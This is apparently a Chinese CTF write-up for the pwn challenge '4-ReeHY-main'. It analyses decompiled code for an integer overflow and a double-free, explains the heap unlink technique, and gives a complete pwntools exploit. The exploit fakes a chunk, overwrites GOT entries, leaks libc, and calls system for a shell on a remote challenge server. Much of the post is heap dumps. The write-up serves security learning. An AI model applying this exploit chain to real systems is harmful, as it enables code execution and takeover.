---
layout: post
title:  4-ReeHY-main
date:   2021-02-17 00:01:01 +0300
image:  2021-02-17-flowers.jpg
tags:   [ctf,Pwn,adworld,看雪CTF,heap,unlink,double-free]
---

#### main()

```assembly
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 savedregs; // [rsp+10h] [rbp+0h]

  sub_400856();
  while ( 1 )
  {
    menu();
    sub_400C55();
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        create();
        break;
      case 2u:
        delete();
        break;
      case 3u:
        edit();
        break;
      case 4u:
        show();
        break;
      case 5u:
        puts("bye~bye~ young hacker");
        exit(0);
        return;
      default:
        puts("Invalid Choice!");
        break;
    }
  }
}
```

#### menu()

```assembly
ssize_t sub_400943()
{
  puts("******************************");
  puts("Welcome to my black weapon storage!");
  puts("Now you can use it to do some evil things");
  puts("1. create exploit");
  puts("2. delete exploit");
  puts("3. edit exploit");
  puts("4. show exploit");
  puts("5. exit");
  puts("******************************");
  return write(1, "$ ", 2uLL);
}
```

#### create()

```assembly
signed int sub_4009D1()
{
  signed int result; // eax
  char buf; // [rsp+0h] [rbp-90h]
  void *dest; // [rsp+80h] [rbp-10h]
  int v3; // [rsp+88h] [rbp-8h]
  size_t nbytes; // [rsp+8Ch] [rbp-4h]

  result = dword_6020AC;
  if ( dword_6020AC <= 4 )
  {
    puts("Input size");
    result = sub_400C55();
    LODWORD(nbytes) = result;
    if ( result <= 4096 )
    {
      puts("Input cun");
      result = sub_400C55();
      v3 = result;
      if ( result <= 4 )
      {
        dest = malloc((signed int)nbytes);
        puts("Input content");
        if ( (signed int)nbytes > 112 )
        {
          read(0, dest, (unsigned int)nbytes);
        }
        else
        {
          read(0, &buf, (unsigned int)nbytes);
          memcpy(dest, &buf, (signed int)nbytes);
        }
        *(_DWORD *)(qword_6020C0 + 4LL * v3) = nbytes;
        *((_QWORD *)&unk_6020E0 + 2 * v3) = dest;
        dword_6020E8[4 * v3] = 1;
        ++dword_6020AC;
        result = fflush(stdout);
      }
    }
  }
  return result;
}
```

这里的cun其实就是索引。

malloc之前没有验证块是否存在。

size和cun都是可以通过输入负数，接着通过强类型转换`unsigned int`来转换成很大的整数来整形溢出。

#### delete()

```assembly
__int64 delete()
{
  __int64 result; // rax
  int v1; // [rsp+Ch] [rbp-4h]

  puts("Chose one to dele");
  result = sub_400C55();
  v1 = result;
  if ( (signed int)result <= 4 )
  {
    free(*((void **)&unk_6020E0 + 2 * (signed int)result));
    dword_6020E8[4 * v1] = 0;
    puts("dele success!");
    result = (unsigned int)(dword_6020AC-- - 1);
  }
  return result;
}
```

free后，指针置零，不存在UAF。

删除之前没有判断块是否被删除了，所以可以构造`double-free`

#### edit()

```assembly
signed int edit()
{
  signed int result; // eax
  signed int v1; // [rsp+Ch] [rbp-4h]

  puts("Chose one to edit");
  result = sub_400C55();
  v1 = result;
  if ( result <= 4 )
  {
    result = dword_6020E8[4 * result];
    if ( result == 1 )
    {
      puts("Input the content");
      read(0, *((void **)&unk_6020E0 + 2 * v1), *(unsigned int *)(4LL * v1 + qword_6020C0));
      result = puts("Edit success!");
    }
  }
  return result;
}
```

编辑之前验证了块是否存在。

#### show()

```assembly
int sub_400C42()
{
  return puts("No~No~No~");
}
```

### Unlink利用思路

#### 条件

1. UAF，可修改free状态下smallbin或是unsorted bin的fd和bk指针
2. 已知位置存在一个指针指向可进行UAF的chunk

#### 效果

使得已指向UAF chunk的指针ptr变为 ptr - 0x18

#### 思路

设指向可 UAF chunk 的指针的地址为 ptr

1. 修改 fd 为 ptr - 0x18
2. 修改 bk 为 ptr - 0x10
3. 触发 unlink

ptr 处的指针会变为 ptr - 0x18。

#### exp：

```assembly
# -*-coding:utf-8-*-
from pwn import *
from LibcSearcher import *

elf = ELF("./4-ReeHY-main")
# libc = ELF("./ctflibc.so.6")

# context.log_level = "debug"

# io = process("./4-ReeHY-main")
io = remote("111.200.241.244",42792)

io.recvuntil("$ ")
io.sendline("melody")

def create(size, cun, content):
    io.recvuntil("$ ")
    io.sendline(str(1))
    io.recvuntil("Input size\n")
    io.sendline(str(size))
    io.recvuntil("Input cun\n")
    io.sendline(str(cun))
    io.recvuntil("Input content\n")
    io.sendline(content)

def delete(cun):
    io.recvuntil("$ ")
    io.sendline(str(2))
    io.recvuntil("Chose one to dele\n")
    io.sendline(str(cun))

def edit(cun, content):
    io.recvuntil("$ ")
    io.sendline(str(3))
    io.recvuntil("Chose one to edit\n")
    io.sendline(str(cun))
    io.recvuntil("Input the content\n")
    io.send(content)

def show():
    io.recvuntil("$ ")
    io.sendline(str(4))

create(0x200, 0, "/bin/sh\x00")
create(0x200, 1, "1")
create(0x200, 2, "2")
create(0x200, 3, "3")
delete(3)
delete(2)
'''
0xfdc050:	0x0000000000000000	0x0000000000000211 0
0xfdc060:	0x0a68732f6e69622f	0x0000000000000000
0xfdc070:	0x0000000000000000	0x0000000000000000
0xfdc080:	0x0000000000000000	0x0000000000000000
0xfdc090:	0x0000000000000000	0x0000000000000000
0xfdc0a0:	0x0000000000000000	0x0000000000000000
0xfdc0b0:	0x0000000000000000	0x0000000000000000
0xfdc0c0:	0x0000000000000000	0x0000000000000000
0xfdc0d0:	0x0000000000000000	0x0000000000000000
0xfdc0e0:	0x0000000000000000	0x0000000000000000
0xfdc0f0:	0x0000000000000000	0x0000000000000000
0xfdc100:	0x0000000000000000	0x0000000000000000
0xfdc110:	0x0000000000000000	0x0000000000000000
0xfdc120:	0x0000000000000000	0x0000000000000000
0xfdc130:	0x0000000000000000	0x0000000000000000
0xfdc140:	0x0000000000000000	0x0000000000000000
0xfdc150:	0x0000000000000000	0x0000000000000000
0xfdc160:	0x0000000000000000	0x0000000000000000
0xfdc170:	0x0000000000000000	0x0000000000000000
0xfdc180:	0x0000000000000000	0x0000000000000000
0xfdc190:	0x0000000000000000	0x0000000000000000
0xfdc1a0:	0x0000000000000000	0x0000000000000000
0xfdc1b0:	0x0000000000000000	0x0000000000000000
0xfdc1c0:	0x0000000000000000	0x0000000000000000
0xfdc1d0:	0x0000000000000000	0x0000000000000000
0xfdc1e0:	0x0000000000000000	0x0000000000000000
0xfdc1f0:	0x0000000000000000	0x0000000000000000
0xfdc200:	0x0000000000000000	0x0000000000000000
0xfdc210:	0x0000000000000000	0x0000000000000000
0xfdc220:	0x0000000000000000	0x0000000000000000
0xfdc230:	0x0000000000000000	0x0000000000000000
0xfdc240:	0x0000000000000000	0x0000000000000000
0xfdc250:	0x0000000000000000	0x0000000000000000
0xfdc260:	0x0000000000000000	0x0000000000000211 1
0xfdc270:	0x0000000000000a31	0x0000000000000000
0xfdc280:	0x0000000000000000	0x0000000000000000
0xfdc290:	0x0000000000000000	0x0000000000000000
0xfdc2a0:	0x0000000000000000	0x0000000000000000
0xfdc2b0:	0x0000000000000000	0x0000000000000000
0xfdc2c0:	0x0000000000000000	0x0000000000000000
0xfdc2d0:	0x0000000000000000	0x0000000000000000
0xfdc2e0:	0x0000000000000000	0x0000000000000000
0xfdc2f0:	0x0000000000000000	0x0000000000000000
0xfdc300:	0x0000000000000000	0x0000000000000000
0xfdc310:	0x0000000000000000	0x0000000000000000
0xfdc320:	0x0000000000000000	0x0000000000000000
0xfdc330:	0x0000000000000000	0x0000000000000000
0xfdc340:	0x0000000000000000	0x0000000000000000
0xfdc350:	0x0000000000000000	0x0000000000000000
0xfdc360:	0x0000000000000000	0x0000000000000000
0xfdc370:	0x0000000000000000	0x0000000000000000
0xfdc380:	0x0000000000000000	0x0000000000000000
0xfdc390:	0x0000000000000000	0x0000000000000000
0xfdc3a0:	0x0000000000000000	0x0000000000000000
0xfdc3b0:	0x0000000000000000	0x0000000000000000
0xfdc3c0:	0x0000000000000000	0x0000000000000000
0xfdc3d0:	0x0000000000000000	0x0000000000000000
0xfdc3e0:	0x0000000000000000	0x0000000000000000
0xfdc3f0:	0x0000000000000000	0x0000000000000000
0xfdc400:	0x0000000000000000	0x0000000000000000
0xfdc410:	0x0000000000000000	0x0000000000000000
0xfdc420:	0x0000000000000000	0x0000000000000000
0xfdc430:	0x0000000000000000	0x0000000000000000
0xfdc440:	0x0000000000000000	0x0000000000000000
0xfdc450:	0x0000000000000000	0x0000000000000000
0xfdc460:	0x0000000000000000	0x0000000000000000
0xfdc470:	0x0000000000000000	0x0000000000020b91 (2)
0xfdc480:	0x0000000000000a32	0x0000000000000000
0xfdc490:	0x0000000000000000	0x0000000000000000
0xfdc4a0:	0x0000000000000000	0x0000000000000000
0xfdc4b0:	0x0000000000000000	0x0000000000000000
0xfdc4c0:	0x0000000000000000	0x0000000000000000
0xfdc4d0:	0x0000000000000000	0x0000000000000000
0xfdc4e0:	0x0000000000000000	0x0000000000000000
0xfdc4f0:	0x0000000000000000	0x0000000000000000
0xfdc500:	0x0000000000000000	0x0000000000000000
0xfdc510:	0x0000000000000000	0x0000000000000000
0xfdc520:	0x0000000000000000	0x0000000000000000
0xfdc530:	0x0000000000000000	0x0000000000000000
0xfdc540:	0x0000000000000000	0x0000000000000000
0xfdc550:	0x0000000000000000	0x0000000000000000
0xfdc560:	0x0000000000000000	0x0000000000000000
0xfdc570:	0x0000000000000000	0x0000000000000000
0xfdc580:	0x0000000000000000	0x0000000000000000
0xfdc590:	0x0000000000000000	0x0000000000000000
0xfdc5a0:	0x0000000000000000	0x0000000000000000
0xfdc5b0:	0x0000000000000000	0x0000000000000000
0xfdc5c0:	0x0000000000000000	0x0000000000000000
0xfdc5d0:	0x0000000000000000	0x0000000000000000
0xfdc5e0:	0x0000000000000000	0x0000000000000000
0xfdc5f0:	0x0000000000000000	0x0000000000000000
0xfdc600:	0x0000000000000000	0x0000000000000000
0xfdc610:	0x0000000000000000	0x0000000000000000
0xfdc620:	0x0000000000000000	0x0000000000000000
0xfdc630:	0x0000000000000000	0x0000000000000000
0xfdc640:	0x0000000000000000	0x0000000000000000
0xfdc650:	0x0000000000000000	0x0000000000000000
0xfdc660:	0x0000000000000000	0x0000000000000000
0xfdc670:	0x0000000000000000	0x0000000000000000
0xfdc680:	0x0000000000000000	0x0000000000020981 (3)
0xfdc690:	0x0000000000000a33	0x0000000000000000
0xfdc6a0:	0x0000000000000000	0x0000000000000000
0xfdc6b0:	0x0000000000000000	0x0000000000000000
0xfdc6c0:	0x0000000000000000	0x0000000000000000
0xfdc6d0:	0x0000000000000000	0x0000000000000000
0xfdc6e0:	0x0000000000000000	0x0000000000000000
0xfdc6f0:	0x0000000000000000	0x0000000000000000
0xfdc700:	0x0000000000000000	0x0000000000000000
0xfdc710:	0x0000000000000000	0x0000000000000000
0xfdc720:	0x0000000000000000	0x0000000000000000
0xfdc730:	0x0000000000000000	0x0000000000000000
0xfdc740:	0x0000000000000000	0x0000000000000000
0xfdc750:	0x0000000000000000	0x0000000000000000
0xfdc760:	0x0000000000000000	0x0000000000000000
0xfdc770:	0x0000000000000000	0x0000000000000000
0xfdc780:	0x0000000000000000	0x0000000000000000
0xfdc790:	0x0000000000000000	0x0000000000000000
0xfdc7a0:	0x0000000000000000	0x0000000000000000
0xfdc7b0:	0x0000000000000000	0x0000000000000000
0xfdc7c0:	0x0000000000000000	0x0000000000000000
0xfdc7d0:	0x0000000000000000	0x0000000000000000
0xfdc7e0:	0x0000000000000000	0x0000000000000000
0xfdc7f0:	0x0000000000000000	0x0000000000000000
0xfdc800:	0x0000000000000000	0x0000000000000000
0xfdc810:	0x0000000000000000	0x0000000000000000
0xfdc820:	0x0000000000000000	0x0000000000000000
0xfdc830:	0x0000000000000000	0x0000000000000000
0xfdc840:	0x0000000000000000	0x0000000000000000
0xfdc850:	0x0000000000000000	0x0000000000000000
0xfdc860:	0x0000000000000000	0x0000000000000000
0xfdc870:	0x0000000000000000	0x0000000000000000
0xfdc880:	0x0000000000000000	0x0000000000000000
'''

# 0x6020E0->0
# 0x6020F0->1
# 0x602100->2
start = 0x602100
payload = p64(0) + p64(0x200 + 1) + p64(start - 0x18) + p64(start - 0x10)
payload += "a"*(0x200 - 0x8 * 4)
# INTERNAL_SIZE_T      prev_size
# INTERNAL_SIZE_T      size
payload += p64(0x200) + p64(0x200)
create(0x400, 2, payload)
'''
0x1deb050:	0x0000000000000000	0x0000000000000211 0
0x1deb060:	0x0a68732f6e69622f	0x0000000000000000
0x1deb070:	0x0000000000000000	0x0000000000000000
0x1deb080:	0x0000000000000000	0x0000000000000000
0x1deb090:	0x0000000000000000	0x0000000000000000
0x1deb0a0:	0x0000000000000000	0x0000000000000000
0x1deb0b0:	0x0000000000000000	0x0000000000000000
0x1deb0c0:	0x0000000000000000	0x0000000000000000
0x1deb0d0:	0x0000000000000000	0x0000000000000000
0x1deb0e0:	0x0000000000000000	0x0000000000000000
0x1deb0f0:	0x0000000000000000	0x0000000000000000
0x1deb100:	0x0000000000000000	0x0000000000000000
0x1deb110:	0x0000000000000000	0x0000000000000000
0x1deb120:	0x0000000000000000	0x0000000000000000
0x1deb130:	0x0000000000000000	0x0000000000000000
0x1deb140:	0x0000000000000000	0x0000000000000000
0x1deb150:	0x0000000000000000	0x0000000000000000
0x1deb160:	0x0000000000000000	0x0000000000000000
0x1deb170:	0x0000000000000000	0x0000000000000000
0x1deb180:	0x0000000000000000	0x0000000000000000
0x1deb190:	0x0000000000000000	0x0000000000000000
0x1deb1a0:	0x0000000000000000	0x0000000000000000
0x1deb1b0:	0x0000000000000000	0x0000000000000000
0x1deb1c0:	0x0000000000000000	0x0000000000000000
0x1deb1d0:	0x0000000000000000	0x0000000000000000
0x1deb1e0:	0x0000000000000000	0x0000000000000000
0x1deb1f0:	0x0000000000000000	0x0000000000000000
0x1deb200:	0x0000000000000000	0x0000000000000000
0x1deb210:	0x0000000000000000	0x0000000000000000
0x1deb220:	0x0000000000000000	0x0000000000000000
0x1deb230:	0x0000000000000000	0x0000000000000000
0x1deb240:	0x0000000000000000	0x0000000000000000
0x1deb250:	0x0000000000000000	0x0000000000000000
0x1deb260:	0x0000000000000000	0x0000000000000211 1
0x1deb270:	0x0000000000000a31	0x0000000000000000
0x1deb280:	0x0000000000000000	0x0000000000000000
0x1deb290:	0x0000000000000000	0x0000000000000000
0x1deb2a0:	0x0000000000000000	0x0000000000000000
0x1deb2b0:	0x0000000000000000	0x0000000000000000
0x1deb2c0:	0x0000000000000000	0x0000000000000000
0x1deb2d0:	0x0000000000000000	0x0000000000000000
0x1deb2e0:	0x0000000000000000	0x0000000000000000
0x1deb2f0:	0x0000000000000000	0x0000000000000000
0x1deb300:	0x0000000000000000	0x0000000000000000
0x1deb310:	0x0000000000000000	0x0000000000000000
0x1deb320:	0x0000000000000000	0x0000000000000000
0x1deb330:	0x0000000000000000	0x0000000000000000
0x1deb340:	0x0000000000000000	0x0000000000000000
0x1deb350:	0x0000000000000000	0x0000000000000000
0x1deb360:	0x0000000000000000	0x0000000000000000
0x1deb370:	0x0000000000000000	0x0000000000000000
0x1deb380:	0x0000000000000000	0x0000000000000000
0x1deb390:	0x0000000000000000	0x0000000000000000
0x1deb3a0:	0x0000000000000000	0x0000000000000000
0x1deb3b0:	0x0000000000000000	0x0000000000000000
0x1deb3c0:	0x0000000000000000	0x0000000000000000
0x1deb3d0:	0x0000000000000000	0x0000000000000000
0x1deb3e0:	0x0000000000000000	0x0000000000000000
0x1deb3f0:	0x0000000000000000	0x0000000000000000
0x1deb400:	0x0000000000000000	0x0000000000000000
0x1deb410:	0x0000000000000000	0x0000000000000000
0x1deb420:	0x0000000000000000	0x0000000000000000
0x1deb430:	0x0000000000000000	0x0000000000000000
0x1deb440:	0x0000000000000000	0x0000000000000000
0x1deb450:	0x0000000000000000	0x0000000000000000
0x1deb460:	0x0000000000000000	0x0000000000000000
0x1deb470:	0x0000000000000000	0x0000000000000411 2
0x1deb480:	0x0000000000000000	0x0000000000000201 fake3
0x1deb490:	0x00000000006020e8	0x00000000006020f0
0x1deb4a0:	0x6161616161616161	0x6161616161616161
0x1deb4b0:	0x6161616161616161	0x6161616161616161
0x1deb4c0:	0x6161616161616161	0x6161616161616161
0x1deb4d0:	0x6161616161616161	0x6161616161616161
0x1deb4e0:	0x6161616161616161	0x6161616161616161
0x1deb4f0:	0x6161616161616161	0x6161616161616161
0x1deb500:	0x6161616161616161	0x6161616161616161
0x1deb510:	0x6161616161616161	0x6161616161616161
0x1deb520:	0x6161616161616161	0x6161616161616161
0x1deb530:	0x6161616161616161	0x6161616161616161
0x1deb540:	0x6161616161616161	0x6161616161616161
0x1deb550:	0x6161616161616161	0x6161616161616161
0x1deb560:	0x6161616161616161	0x6161616161616161
0x1deb570:	0x6161616161616161	0x6161616161616161
0x1deb580:	0x6161616161616161	0x6161616161616161
0x1deb590:	0x6161616161616161	0x6161616161616161
0x1deb5a0:	0x6161616161616161	0x6161616161616161
0x1deb5b0:	0x6161616161616161	0x6161616161616161
0x1deb5c0:	0x6161616161616161	0x6161616161616161
0x1deb5d0:	0x6161616161616161	0x6161616161616161
0x1deb5e0:	0x6161616161616161	0x6161616161616161
0x1deb5f0:	0x6161616161616161	0x6161616161616161
0x1deb600:	0x6161616161616161	0x6161616161616161
0x1deb610:	0x6161616161616161	0x6161616161616161
0x1deb620:	0x6161616161616161	0x6161616161616161
0x1deb630:	0x6161616161616161	0x6161616161616161
0x1deb640:	0x6161616161616161	0x6161616161616161
0x1deb650:	0x6161616161616161	0x6161616161616161
0x1deb660:	0x6161616161616161	0x6161616161616161
0x1deb670:	0x6161616161616161	0x6161616161616161
0x1deb680:	0x0000000000000200	0x0000000000000200 (3)
0x1deb690:	0x0000000000000a0a	0x0000000000000000
0x1deb6a0:	0x000000000000000a	0x0000000000000000
0x1deb6b0:	0x0000000000000000	0x0000000000000000
0x1deb6c0:	0x0000000000000000	0x0000000000000000
0x1deb6d0:	0x0000000000000000	0x0000000000000000
0x1deb6e0:	0x0000000000000000	0x0000000000000000
0x1deb6f0:	0x0000000000000000	0x0000000000000000
0x1deb700:	0x0000000000000000	0x0000000000000000
0x1deb710:	0x0000000000000000	0x0000000000000000
0x1deb720:	0x0000000000000000	0x0000000000000000
0x1deb730:	0x0000000000000000	0x0000000000000000
0x1deb740:	0x0000000000000000	0x0000000000000000
0x1deb750:	0x0000000000000000	0x0000000000000000
0x1deb760:	0x0000000000000000	0x0000000000000000
0x1deb770:	0x0000000000000000	0x0000000000000000
0x1deb780:	0x0000000000000000	0x0000000000000000
0x1deb790:	0x0000000000000000	0x0000000000000000
0x1deb7a0:	0x0000000000000000	0x0000000000000000
0x1deb7b0:	0x0000000000000000	0x0000000000000000
0x1deb7c0:	0x0000000000000000	0x0000000000000000
0x1deb7d0:	0x0000000000000000	0x0000000000000000
0x1deb7e0:	0x0000000000000000	0x0000000000000000
0x1deb7f0:	0x0000000000000000	0x0000000000000000
0x1deb800:	0x0000000000000000	0x0000000000000000
0x1deb810:	0x0000000000000000	0x0000000000000000
0x1deb820:	0x0000000000000000	0x0000000000000000
0x1deb830:	0x0000000000000000	0x0000000000000000
0x1deb840:	0x0000000000000000	0x0000000000000000
0x1deb850:	0x0000000000000000	0x0000000000000000
0x1deb860:	0x0000000000000000	0x0000000000000000
0x1deb870:	0x0000000000000000	0x0000000000000000
0x1deb880:	0x0000000000000000	0x0000000000020781
'''

delete(3)
'''
0x1fce050:	0x0000000000000000	0x0000000000000211 0
0x1fce060:	0x0a68732f6e69622f	0x0000000000000000
0x1fce070:	0x0000000000000000	0x0000000000000000
0x1fce080:	0x0000000000000000	0x0000000000000000
0x1fce090:	0x0000000000000000	0x0000000000000000
0x1fce0a0:	0x0000000000000000	0x0000000000000000
0x1fce0b0:	0x0000000000000000	0x0000000000000000
0x1fce0c0:	0x0000000000000000	0x0000000000000000
0x1fce0d0:	0x0000000000000000	0x0000000000000000
0x1fce0e0:	0x0000000000000000	0x0000000000000000
0x1fce0f0:	0x0000000000000000	0x0000000000000000
0x1fce100:	0x0000000000000000	0x0000000000000000
0x1fce110:	0x0000000000000000	0x0000000000000000
0x1fce120:	0x0000000000000000	0x0000000000000000
0x1fce130:	0x0000000000000000	0x0000000000000000
0x1fce140:	0x0000000000000000	0x0000000000000000
0x1fce150:	0x0000000000000000	0x0000000000000000
0x1fce160:	0x0000000000000000	0x0000000000000000
0x1fce170:	0x0000000000000000	0x0000000000000000
0x1fce180:	0x0000000000000000	0x0000000000000000
0x1fce190:	0x0000000000000000	0x0000000000000000
0x1fce1a0:	0x0000000000000000	0x0000000000000000
0x1fce1b0:	0x0000000000000000	0x0000000000000000
0x1fce1c0:	0x0000000000000000	0x0000000000000000
0x1fce1d0:	0x0000000000000000	0x0000000000000000
0x1fce1e0:	0x0000000000000000	0x0000000000000000
0x1fce1f0:	0x0000000000000000	0x0000000000000000
0x1fce200:	0x0000000000000000	0x0000000000000000
0x1fce210:	0x0000000000000000	0x0000000000000000
0x1fce220:	0x0000000000000000	0x0000000000000000
0x1fce230:	0x0000000000000000	0x0000000000000000
0x1fce240:	0x0000000000000000	0x0000000000000000
0x1fce250:	0x0000000000000000	0x0000000000000000
0x1fce260:	0x0000000000000000	0x0000000000000211 1
0x1fce270:	0x0000000000000a31	0x0000000000000000
0x1fce280:	0x0000000000000000	0x0000000000000000
0x1fce290:	0x0000000000000000	0x0000000000000000
0x1fce2a0:	0x0000000000000000	0x0000000000000000
0x1fce2b0:	0x0000000000000000	0x0000000000000000
0x1fce2c0:	0x0000000000000000	0x0000000000000000
0x1fce2d0:	0x0000000000000000	0x0000000000000000
0x1fce2e0:	0x0000000000000000	0x0000000000000000
0x1fce2f0:	0x0000000000000000	0x0000000000000000
0x1fce300:	0x0000000000000000	0x0000000000000000
0x1fce310:	0x0000000000000000	0x0000000000000000
0x1fce320:	0x0000000000000000	0x0000000000000000
0x1fce330:	0x0000000000000000	0x0000000000000000
0x1fce340:	0x0000000000000000	0x0000000000000000
0x1fce350:	0x0000000000000000	0x0000000000000000
0x1fce360:	0x0000000000000000	0x0000000000000000
0x1fce370:	0x0000000000000000	0x0000000000000000
0x1fce380:	0x0000000000000000	0x0000000000000000
0x1fce390:	0x0000000000000000	0x0000000000000000
0x1fce3a0:	0x0000000000000000	0x0000000000000000
0x1fce3b0:	0x0000000000000000	0x0000000000000000
0x1fce3c0:	0x0000000000000000	0x0000000000000000
0x1fce3d0:	0x0000000000000000	0x0000000000000000
0x1fce3e0:	0x0000000000000000	0x0000000000000000
0x1fce3f0:	0x0000000000000000	0x0000000000000000
0x1fce400:	0x0000000000000000	0x0000000000000000
0x1fce410:	0x0000000000000000	0x0000000000000000
0x1fce420:	0x0000000000000000	0x0000000000000000
0x1fce430:	0x0000000000000000	0x0000000000000000
0x1fce440:	0x0000000000000000	0x0000000000000000
0x1fce450:	0x0000000000000000	0x0000000000000000
0x1fce460:	0x0000000000000000	0x0000000000000000
0x1fce470:	0x0000000000000000	0x0000000000000411 2
0x1fce480:	0x0000000000000000	0x0000000000020b81 (fake3)
0x1fce490:	0x00000000006020e8	0x00000000006020f0
0x1fce4a0:	0x6161616161616161	0x6161616161616161
0x1fce4b0:	0x6161616161616161	0x6161616161616161
0x1fce4c0:	0x6161616161616161	0x6161616161616161
0x1fce4d0:	0x6161616161616161	0x6161616161616161
0x1fce4e0:	0x6161616161616161	0x6161616161616161
0x1fce4f0:	0x6161616161616161	0x6161616161616161
0x1fce500:	0x6161616161616161	0x6161616161616161
0x1fce510:	0x6161616161616161	0x6161616161616161
0x1fce520:	0x6161616161616161	0x6161616161616161
0x1fce530:	0x6161616161616161	0x6161616161616161
0x1fce540:	0x6161616161616161	0x6161616161616161
0x1fce550:	0x6161616161616161	0x6161616161616161
0x1fce560:	0x6161616161616161	0x6161616161616161
0x1fce570:	0x6161616161616161	0x6161616161616161
0x1fce580:	0x6161616161616161	0x6161616161616161
0x1fce590:	0x6161616161616161	0x6161616161616161
0x1fce5a0:	0x6161616161616161	0x6161616161616161
0x1fce5b0:	0x6161616161616161	0x6161616161616161
0x1fce5c0:	0x6161616161616161	0x6161616161616161
0x1fce5d0:	0x6161616161616161	0x6161616161616161
0x1fce5e0:	0x6161616161616161	0x6161616161616161
0x1fce5f0:	0x6161616161616161	0x6161616161616161
0x1fce600:	0x6161616161616161	0x6161616161616161
0x1fce610:	0x6161616161616161	0x6161616161616161
0x1fce620:	0x6161616161616161	0x6161616161616161
0x1fce630:	0x6161616161616161	0x6161616161616161
0x1fce640:	0x6161616161616161	0x6161616161616161
0x1fce650:	0x6161616161616161	0x6161616161616161
0x1fce660:	0x6161616161616161	0x6161616161616161
0x1fce670:	0x6161616161616161	0x6161616161616161
0x1fce680:	0x0000000000000200	0x0000000000000200 (3)
0x1fce690:	0x0000000000000a0a	0x0000000000000000
0x1fce6a0:	0x0000000000000000	0x0000000000000000
0x1fce6b0:	0x0000000000000000	0x0000000000000000
0x1fce6c0:	0x0000000000000000	0x0000000000000000
0x1fce6d0:	0x0000000000000000	0x0000000000000000
0x1fce6e0:	0x0000000000000000	0x0000000000000000
0x1fce6f0:	0x0000000000000000	0x0000000000000000
0x1fce700:	0x0000000000000000	0x0000000000000000
0x1fce710:	0x0000000000000000	0x0000000000000000
0x1fce720:	0x0000000000000000	0x0000000000000000
0x1fce730:	0x0000000000000000	0x0000000000000000
0x1fce740:	0x0000000000000000	0x0000000000000000
0x1fce750:	0x0000000000000000	0x0000000000000000
0x1fce760:	0x0000000000000000	0x0000000000000000
0x1fce770:	0x0000000000000000	0x0000000000000000
0x1fce780:	0x0000000000000000	0x0000000000000000
0x1fce790:	0x0000000000000000	0x0000000000000000
0x1fce7a0:	0x0000000000000000	0x0000000000000000
0x1fce7b0:	0x0000000000000000	0x0000000000000000
0x1fce7c0:	0x0000000000000000	0x0000000000000000
0x1fce7d0:	0x0000000000000000	0x0000000000000000
0x1fce7e0:	0x0000000000000000	0x0000000000000000
0x1fce7f0:	0x0000000000000000	0x0000000000000000
0x1fce800:	0x0000000000000000	0x0000000000000000
0x1fce810:	0x0000000000000000	0x0000000000000000
0x1fce820:	0x0000000000000000	0x0000000000000000
0x1fce830:	0x0000000000000000	0x0000000000000000
0x1fce840:	0x0000000000000000	0x0000000000000000
0x1fce850:	0x0000000000000000	0x0000000000000000
0x1fce860:	0x0000000000000000	0x0000000000000000
0x1fce870:	0x0000000000000000	0x0000000000000000
0x1fce880:	0x0000000000000000	0x0000000000020781
'''

free_got = elf.got["free"]
atoi_got = elf.got["atoi"]
puts_plt = 0x4006d0
edit(2, "b"*0x18 + p64(free_got) + p64(1) + p64(atoi_got))
# 这里修改的是存放指向2和3的指针的位置
# 原本指向2的指针已指向got表中的free，
# 原本指向3的指针指向got表中atoi函数的位置

edit(2, p64(puts_plt))
# 将index2指向的free()的got表改为puts()的got地址

delete(3)
# free()实际为puts()
# free(3)实际为puts(atoi_got)

addr = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
print(hex(addr))

# base = addr - libc.symbols["atoi"]
# system = base + libc.symbols["system"]

libc = LibcSearcher("atoi", addr)
base = addr - libc.dump("atoi")
system = base + libc.dump("system")

edit(2, p64(system))
# 将index2指向的puts()的got表改为system()的地址

delete(0)

io.interactive()
```

